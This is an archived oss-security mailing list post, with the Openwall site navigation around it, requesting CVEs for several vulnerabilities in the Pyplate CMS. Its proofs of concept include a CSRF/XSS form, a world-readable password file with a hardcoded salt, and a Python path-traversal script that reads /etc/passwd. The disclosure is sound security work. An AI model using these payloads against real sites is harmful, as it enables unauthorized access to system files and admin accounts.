  oss-security - CVE request: Pyplate multiple vulnerabilities            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Wed, 14 May From: Henri Salo <henri@...v.fi> To: oss-security@...ts.openwall.com Cc: abuse@...LATE.COM, moderators@...db.org Subject: CVE request: Pyplate multiple vulnerabilities  Hello list,  My friend Teemu V. "requested" security audit for Pyplate. While quickly checking quality of this software I noticed following issues. This is not a full security audit as I don't have much free time.  Tested version: (still beta) Vendor notification:  Issue 1.  Installation instruction tells user to execute following commands without checking any checksums or similar:  > wget http://pyplate.com/pyplate_install.sh > chmod +x ./pyplate_install.sh > sudo ./pyplate_install.sh  Issue 2.  File /usr/lib/cgi-bin/create_passwd_file.py creates passwd.db for admin user password with world readable permissions. I like that salt :]   20     salt="bla"  21   22     hash=crypt.crypt(random_string,'$6$'+salt+'$')  23     usercredentials="admin:"+hash  24   25     passwdf=open("./passwd.db",'w')  26     passwdf.write(usercredentials)  27     passwdf.close()   -rw-r--r-- 1 www-data www-data 99 May 13 /usr/share/pyplate/passwd.db  Issue 3.  Application is not using HttpOnly (nor Secure) flag in cookie "id".  Issue 4.  CSRF + XSS with cookie stealing PoC:  <html>   <body>     <form action="http://example.com/admin/addScript.py" method="POST">       <input type="hidden" name="title" />       <input type="hidden" name="file" value="bugs" />       <input type="hidden" name="category" value="&#47;" />       <input type="hidden" name="post" />       <input type="hidden" name="tags" value="" />       <input type="hidden" name="description" value="" />       <input type="hidden" name="state" value="new" />       <input type="submit" value="Submit request" />     </form>   </body> </html>  There is no CSRF protection and most of admin functionality contain stored XSS issues.  Issue 5.  File /usr/lib/cgi-bin/download.py is used to download backup file from installation after admin has created it in web-ui. Note the comment.   21 # need to check that the filename doesn't contain slashes  26     path = pyplate.getCMSRoot() + "/backup/" + filename  27     file = open (path, 'rb')  Normally HTTP POST message looks like:  """ POST /cgi-bin/download.py HTTP/1.1 Host: User-Agent: Mozilla/5.0 (X11; Linux Accept: Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 40  """  Attacker can use this without authentication to download arbitrary files from the system. File needs to be readable by web server process. PoC for /etc/passwd below:  """ #!/usr/bin/env python # -*- coding: utf-8 -*-  import requests payload = {'filename': '../../../../etc/passwd'} r = requests.post('http://example.org/cgi-bin/download.py', data=payload) print r.text """  If author responds with fixed in version I can coordinate this and send email to abuse@Â address for all users (which is not that many currently).  --- Henri Salo  Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      